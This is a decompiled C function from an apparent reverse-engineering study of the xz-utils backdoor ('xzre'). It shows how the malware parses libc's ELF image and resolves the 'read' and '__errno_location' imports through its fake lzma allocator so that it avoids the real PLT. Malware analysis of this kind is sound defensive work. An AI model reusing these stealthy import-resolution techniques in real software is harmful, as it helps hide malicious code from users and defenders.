// /home/kali/xzre-ghidra/xzregh/1045E0_resolve_libc_imports.c
// Function: resolve_libc_imports @ 0x1045E0
// Calling convention: unknown
// Prototype: undefined resolve_libc_imports(void)


/*
 * AutoDoc: Treats `link_map *libc` as another ELF image, runs `elf_parse` to populate `elf_info_t`, and
 * then allocates trampolines for `read` and `__errno_location` via the fake allocator shim. Only
 * when both imports succeed does it mark `libc_imports_t` as ready, ensuring subsequent socket
 * I/O helpers can operate without touching the real PLT.
 */
#include "xzre_types.h"


undefined1  [16]
resolve_libc_imports(undefined8 *param_1,undefined8 param_2,int *param_3,undefined8 param_4)

{
  long lVar1;
  ulong uVar2;
  long lVar3;
  undefined1 auVar4 [16];
  
  lVar1 = get_lzma_allocator(1);
  uVar2 = elf_parse(*param_1,param_2);
  if ((int)uVar2 != 0) {
    *(undefined8 *)(lVar1 + 0x10) = param_2;
    lVar3 = lzma_alloc(0x308,lVar1);
    *(long *)(param_3 + 0x12) = lVar3;
    if (lVar3 != 0) {
      *param_3 = *param_3 + 1;
    }
    lVar1 = lzma_alloc(0x878,lVar1);
    *(long *)(param_3 + 0x14) = lVar1;
    if (lVar1 != 0) {
      *param_3 = *param_3 + 1;
    }
    uVar2 = (ulong)(*param_3 == 2);
  }
  auVar4._8_8_ = param_4;
  auVar4._0_8_ = uVar2;
  return auVar4;
}

